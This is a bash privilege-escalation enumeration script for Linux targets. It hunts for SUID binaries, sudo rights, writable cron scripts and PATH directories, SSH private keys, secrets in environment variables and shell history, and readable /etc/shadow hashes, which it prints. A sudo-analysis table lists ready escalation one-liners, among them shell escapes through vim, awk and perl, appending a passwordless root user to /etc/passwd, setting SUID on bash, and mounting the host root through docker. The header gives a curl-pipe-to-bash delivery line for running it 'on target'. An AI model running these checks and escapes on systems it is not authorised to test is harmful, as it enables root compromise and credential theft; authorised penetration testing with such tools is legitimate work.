#!/bin/bash
# sysaudit.sh — Linux privilege escalation checker (bash rewrite of sysaudit.py)
#
# Runs on ANY Linux/Unix with bash. No Python, no pip, no external tools.
# Works on Alpine, BusyBox, minimal containers, ancient kernels.
#
# Usage:
#   bash sysaudit.sh
#   bash sysaudit.sh --fast              # skip slow find operations
#   bash sysaudit.sh --section sudo      # run one section only
#   bash sysaudit.sh --out /tmp/r.txt    # save output to file
#
# One-liner delivery (no file needed on target):
#   curl -s http://yourserver/sysaudit.sh | bash
#   wget -qO- http://yourserver/sysaudit.sh | bash

set -euo pipefail 2>/dev/null || true

# ── Colours ────────────────────────────────────────────────────────────────────
R='\033[31m'; G='\033[32m'; Y='\033[33m'; C='\033[36m'; B='\033[1m'; X='\033[0m'
[ -t 1 ] || { R=''; G=''; Y=''; C=''; B=''; X=''; }  # strip colours if not TTY

banner()  { printf "\n${B}${C}%s\n  %s\n%s${X}\n" "$(printf '═%.0s' {1..60})" "$1" "$(printf '═%.0s' {1..60})"; }
hit()     { printf "  ${R}[!]${X} %s\n" "$1"; }
warn()    { printf "  ${Y}[*]${X} %s\n" "$1"; }
good()    { printf "  ${G}[+]${X} %s\n" "$1"; }
info()    { printf "  ${C}[-]${X} %s\n" "$1"; }
sub()     { printf "      %s\n" "$1"; }

FAST=0; SECTION=""; OUT=""
while [[ $# -gt 0 ]]; do
  case "$1" in
    --fast)         FAST=1 ;;
    --section)      SECTION="$2"; shift ;;
    --out)          OUT="$2"; shift ;;
  esac
  shift
done

# Redirect output to file if --out given
if [[ -n "$OUT" ]]; then
  exec > >(tee "$OUT") 2>&1
fi

run() { "$@" 2>/dev/null || true; }

# ── GTFOBins list ──────────────────────────────────────────────────────────────
GTFO="nmap vim vi nano less more man awk find python python2 python3 perl ruby lua php bash sh
zsh dash ksh tcsh csh fish tar zip unzip gzip bzip2 7z curl wget ftp tftp socat nc netcat
ncat telnet ssh scp rsync git svn gcc cc make tee cp mv dd cat head tail xargs env nice
timeout strace gdb screen tmux pico joe emacs ed xxd od base64 openssl mysql sqlite3 node
ruby irb tclsh expect docker lxc kubectl apt pip pip3 gem chmod chown install ln mount
systemctl journalctl tcpdump nsenter chroot pkexec newgrp sg"

is_gtfo() {
  local name
  name=$(basename "$1")
  echo "$GTFO" | tr ' ' '\n' | grep -qx "$name"
}

# ══════════════════════════════════════════════════════════════════════════════
section_system() {
  banner "SYSTEM INFO"
  info "Hostname  : $(hostname)"
  info "Kernel    : $(uname -r)"
  info "OS        : $(cat /etc/os-release 2>/dev/null | grep PRETTY | cut -d= -f2 | tr -d '"' || uname -s)"
  info "Arch      : $(uname -m)"
  info "User      : $(id)"
  info "Shell     : ${SHELL:-unknown}"
  info "Uptime    : $(uptime 2>/dev/null | head -1)"

  # Kernel CVE hints
  local major minor
  major=$(uname -r | cut -d. -f1)
  minor=$(uname -r | cut -d. -f2)
  [[ "$major" -eq 4 && "$minor" -le 8 ]] && hit "Kernel $(uname -r) — check CVE-2016-5195 (DirtyCow)"
  [[ "$major" -eq 3 && "$minor" -le 13 ]] && hit "Kernel $(uname -r) — check CVE-2014-4699"
  [[ "$major" -le 5 && "$minor" -le 8 ]] && hit "Kernel $(uname -r) — check CVE-2021-4034 (PwnKit)"
}

# ══════════════════════════════════════════════════════════════════════════════
section_users() {
  banner "USERS & GROUPS"
  info "Current: $(id)"
  local groups
  groups=$(id)
  for g in docker lxd lxc disk adm shadow sudo wheel staff video kvm; do
    echo "$groups" | grep -qw "$g" && hit "Member of '$g' group — privesc vector possible"
  done

  info "Users with login shell:"
  while IFS=: read -r uname _ uid _ _ _ shell; do
    [[ "$shell" =~ (nologin|false|sync|halt|shutdown) ]] && continue
    [[ -z "$shell" ]] && continue
    if [[ "$uid" -eq 0 ]]; then
      sub "$uname (uid=0)  $(printf "${R}[ROOT]${X}")"
    elif [[ "$uid" -ge 1000 ]]; then
      sub "$uname (uid=$uid)"
    fi
  done < /etc/passwd

  info "Recent logins:"
  run last -n 10 | head -12 | while read -r l; do sub "$l"; done

  if [[ -r /etc/sudoers ]]; then
    good "/etc/sudoers is READABLE"
    grep -v '^#' /etc/sudoers | grep -v '^$' | while read -r l; do sub "$l"; done
  fi
}

# ══════════════════════════════════════════════════════════════════════════════
section_suid() {
  banner "SUID / SGID BINARIES"
  if [[ "$FAST" -eq 1 ]]; then warn "Skipped (--fast mode)"; return; fi
  warn "Searching filesystem — may take a moment …"
  local found
  found=$(find / -perm /6000 -type f 2>/dev/null | sort)
  [[ -z "$found" ]] && { info "None found"; return; }

  local hits=() others=()
  while IFS= read -r f; do
    if is_gtfo "$f"; then hits+=("$f"); else others+=("$f"); fi
  done <<< "$found"

  [[ ${#hits[@]} -gt 0 ]] && hit "${#hits[@]} SUID/SGID with GTFOBins entries:"
  for f in "${hits[@]}"; do printf "    ${R}★ %s${X}\n" "$f"; done

  [[ ${#others[@]} -gt 0 ]] && info "${#others[@]} other SUID/SGID binaries:"
  for f in "${others[@]}"; do sub "$f"; done
}

# ══════════════════════════════════════════════════════════════════════════════
section_caps() {
  banner "FILE CAPABILITIES"
  if ! command -v getcap &>/dev/null; then info "getcap not available"; return; fi
  local out
  out=$(getcap -r / 2>/dev/null)
  [[ -z "$out" ]] && { info "No capabilities found"; return; }
  while IFS= read -r l; do
    echo "$l" | grep -qi 'cap_setuid\|cap_setgid\|cap_dac_override\|cap_sys_admin\|cap_net_raw\|cap_sys_ptrace' \
      && hit "$l" || info "$l"
  done <<< "$out"
}

# ══════════════════════════════════════════════════════════════════════════════
section_sudo() {
  banner "SUDO ANALYSIS"
  local out
  out=$(sudo -l 2>/dev/null) || { info "sudo -l failed (no rights or requires password)"; return; }
  printf "  %s\n" "$out"

  declare -A bypasses=(
    ["NOPASSWD.*ALL"]="ALL commands as root with no password — trivial"
    ["NOPASSWD.*\bvim\b"]="vim: :!/bin/bash"
    ["NOPASSWD.*\bvi\b"]="vi: :!/bin/bash"
    ["NOPASSWD.*\bfind\b"]="find: find -exec /bin/sh \\; or find -exec python"
    ["NOPASSWD.*\bawk\b"]="awk: awk 'BEGIN{system(\"/bin/bash\")}'"
    ["NOPASSWD.*\bless\b"]="less: !bash"
    ["NOPASSWD.*\bmore\b"]="more: !bash"
    ["NOPASSWD.*\bnano\b"]="nano: Ctrl-R Ctrl-X exec"
    ["NOPASSWD.*\bperl\b"]="perl: perl -e 'exec \"/bin/bash\"'"
    ["NOPASSWD.*python"]="python: python -c 'import os;os.system(\"/bin/bash\")'"
    ["NOPASSWD.*\bruby\b"]="ruby: ruby -e 'exec \"/bin/bash\"'"
    ["NOPASSWD.*\bnmap\b"]="nmap: nmap --interactive OR echo \"os.execute('/bin/sh')\" | nmap --script"
    ["NOPASSWD.*\btee\b"]="tee: echo 'root2::0:0:::/bin/bash' | sudo tee -a /etc/passwd"
    ["NOPASSWD.*\bcp\b"]="cp: overwrite /etc/passwd or sudoers"
    ["NOPASSWD.*\bchmod\b"]="chmod: chmod u+s /bin/bash"
    ["NOPASSWD.*\bcurl\b"]="curl: curl file:///etc/shadow"
    ["NOPASSWD.*\bdocker\b"]="docker: docker run -v /:/mnt alpine chroot /mnt sh"
    ["NOPASSWD.*\benv\b"]="env: env /bin/bash"
    ["env_keep.*LD_PRELOAD"]="LD_PRELOAD kept — compile shared lib calling setuid(0)+system('/bin/bash')"
    ["env_keep.*PYTHONPATH"]="PYTHONPATH kept — drop malicious module in search path"
  )
  for pattern in "${!bypasses[@]}"; do
    echo "$out" | grep -Eqi "$pattern" && hit "${bypasses[$pattern]}"
  done
}

# ══════════════════════════════════════════════════════════════════════════════
section_cron() {
  banner "CRON JOBS"
  local found=0
  for f in /etc/crontab /etc/cron.d/* /etc/cron.hourly/* /etc/cron.daily/* \
           /etc/cron.weekly/* /etc/cron.monthly/* /var/spool/cron/crontabs/*; do
    [[ -r "$f" ]] || continue
    info "$f:"
    while IFS= read -r line; do
      [[ "$line" =~ ^# ]] && continue
      [[ -z "$line" ]] && continue
      sub "$line"
      found=1
      # Check if referenced script is writable
      script=$(echo "$line" | grep -oE '(/[^ ;|&]+\.(sh|py|pl|rb|php))' | head -1)
      if [[ -n "$script" ]]; then
        if [[ -w "$script" ]]; then
          hit "Writable cron script: $script"
        elif [[ ! -e "$script" ]]; then
          hit "Missing cron script (path hijack): $script"
        fi
      fi
    done < "$f"
  done
  [[ "$found" -eq 0 ]] && info "No readable cron jobs found"
}

# ══════════════════════════════════════════════════════════════════════════════
section_services() {
  banner "SERVICES & LISTENING PORTS"
  info "Listening ports:"
  run ss -tlnpu || run netstat -tlnpu || info "(ss and netstat unavailable)"
  info "Running services:"
  run systemctl list-units --type=service --state=running 2>/dev/null | head -30 ||
  run service --status-all 2>/dev/null | grep "+" | head -20
}

# ══════════════════════════════════════════════════════════════════════════════
section_files() {
  banner "INTERESTING FILES"
  if [[ "$FAST" -eq 1 ]]; then warn "Skipped (--fast mode)"; return; fi

  info "World-writable files (excl. /proc /sys /dev /tmp /run):"
  find / -maxdepth 8 -type f -perm -0002 \
    ! -path '/proc/*' ! -path '/sys/*' ! -path '/dev/*' \
    ! -path '/tmp/*' ! -path '/run/*' 2>/dev/null | head -30 | while read -r f; do hit "$f"; done

  info "Password / key files:"
  find / -maxdepth 10 -type f \( \
    -name '*pass*' -o -name '*secret*' -o -name '*.key' -o \
    -name '*.pem' -o -name '*.pfx' -o -name 'id_rsa' -o \
    -name 'id_ed25519' -o -name '*.ovpn' \
  \) 2>/dev/null | head -40 | while read -r f; do hit "$f"; done

  if [[ -r /etc/shadow ]]; then
    hit "/etc/shadow is READABLE:"
    grep -v ':\*:\|:!:' /etc/shadow | while read -r l; do hit "  $l"; done
  fi
}

# ══════════════════════════════════════════════════════════════════════════════
section_env() {
  banner "ENVIRONMENT & PATH"
  env | while IFS='=' read -r k v; do
    echo "$k" | grep -Eqi 'PASS|TOKEN|SECRET|KEY|API|AWS|AZURE|GCP|AUTH|CRED' && hit "$k=$v" || info "$k=$v"
  done

  info "PATH analysis:"
  IFS=: read -ra pdirs <<< "$PATH"
  for d in "${pdirs[@]}"; do
    if [[ -z "$d" ]]; then
      hit "Empty PATH entry — current directory injection possible"
    elif [[ -w "$d" ]]; then
      hit "Writable PATH dir: $d — PATH hijack possible"
    elif [[ ! -e "$d" ]]; then
      hit "Missing PATH dir: $d — create it for hijack"
    else
      sub "$d"
    fi
  done
}

# ══════════════════════════════════════════════════════════════════════════════
section_docker() {
  banner "CONTAINER / VIRTUALISATION"
  [[ -f /.dockerenv ]] && hit "/.dockerenv found — inside Docker"
  [[ -f /run/.containerenv ]] && hit "/run/.containerenv — inside Podman/container"
  grep -qi 'docker\|lxc\|kubepods' /proc/1/cgroup 2>/dev/null && hit "/proc/1/cgroup indicates container"

  for sock in /var/run/docker.sock /run/docker.sock; do
    [[ -r "$sock" ]] && hit "Docker socket readable: $sock → docker run -v /:/mnt alpine chroot /mnt sh"
  done

  command -v nsenter &>/dev/null && warn "nsenter available — namespace escape possible"
  run systemd-detect-virt 2>/dev/null | while read -r v; do info "Virtualisation: $v"; done
}

# ══════════════════════════════════════════════════════════════════════════════
section_ssh() {
  banner "SSH KEYS"
  for root in "$HOME" /root /home/*; do
    for kf in id_rsa id_ed25519 id_ecdsa id_dsa authorized_keys known_hosts; do
      local p="$root/.ssh/$kf"
      [[ -e "$p" ]] || continue
      if [[ -r "$p" ]]; then
        good "Readable: $p"
        grep -q 'PRIVATE KEY' "$p" 2>/dev/null && hit "Private key readable: $p"
      else
        info "Exists but not readable: $p"
      fi
    done
  done
}

# ══════════════════════════════════════════════════════════════════════════════
section_history() {
  banner "SHELL HISTORY"
  for hf in ~/.bash_history ~/.zsh_history ~/.sh_history ~/.history \
            ~/.python_history ~/.mysql_history /root/.bash_history; do
    [[ -r "$hf" ]] || continue
    info "$hf ($(wc -l < "$hf") lines):"
    grep -Ei 'pass(word)?|token|secret|api.?key|curl.+-u|sshpass|AWS_|base64' "$hf" 2>/dev/null |
      while read -r l; do hit "  $l"; done
  done
}

# ══════════════════════════════════════════════════════════════════════════════
declare -A SECTIONS=(
  [system]=section_system   [users]=section_users     [suid]=section_suid
  [caps]=section_caps       [sudo]=section_sudo       [cron]=section_cron
  [services]=section_services [files]=section_files   [env]=section_env
  [docker]=section_docker   [ssh]=section_ssh         [history]=section_history
)

start=$(date +%s)
printf "\n${B}%s${X}\n" "$(printf '=%.0s' {1..60})"
printf "${B}  sysaudit.sh — Linux Privesc Checker${X}\n"
printf "${B}  $(date '+%Y-%m-%d %H:%M:%S')  |  $(hostname)${X}\n"
printf "${B}%s${X}\n\n" "$(printf '=%.0s' {1..60})"

if [[ -n "$SECTION" ]]; then
  fn="${SECTIONS[$SECTION]:-}"
  [[ -n "$fn" ]] && $fn || { echo "Unknown section: $SECTION"; exit 1; }
else
  for fn in section_system section_users section_suid section_caps section_sudo \
            section_cron section_services section_files section_env \
            section_docker section_ssh section_history; do
    $fn 2>/dev/null || true
  done
fi

elapsed=$(( $(date +%s) - start ))
printf "\n${B}Done in %ds${X}\n\n" "$elapsed"
